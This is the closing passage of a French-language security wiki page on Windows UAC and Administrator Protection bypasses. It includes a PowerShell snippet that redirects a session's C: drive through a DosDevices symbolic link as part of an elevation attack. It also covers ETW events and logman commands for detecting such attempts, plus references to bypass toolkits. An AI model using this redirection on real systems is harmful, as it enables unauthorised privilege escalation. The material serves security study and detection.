Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
Sur les hôtes preview, Administrator Protection enregistre les approbations et les échecs sous forme d’événements ETW **15031** et **15032** auprès du provider `Microsoft-Windows-LUA`. Les événements incluent le SID du demandeur, le chemin de l’application, le résultat, le compte administrateur géré et la méthode d’authentification. Les tentatives d’exploitation répétées ou le pilotage de l’interface ayant échoué ne sont donc pas exempts de télémétrie.<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS : Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Fonctionnement du contrôle de compte d’utilisateur](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Collection de techniques de contournement de l’UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Scanner de compatibilité et launcher de contournement de l’UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI adopte l’IA pour générer des backdoors PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Opération TrueChaos : exploitation d’un 0-day contre des cibles gouvernementales d’Asie du Sud-Est](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Contournement de la protection des administrateurs Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Contourner l’UAC à l’aide de la tâche SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Contournements UnifiedConsent, TabTip et Narrator avec notification permanente](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Protection des administrateurs](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
{{#include ../../banners/hacktricks-training.md}}
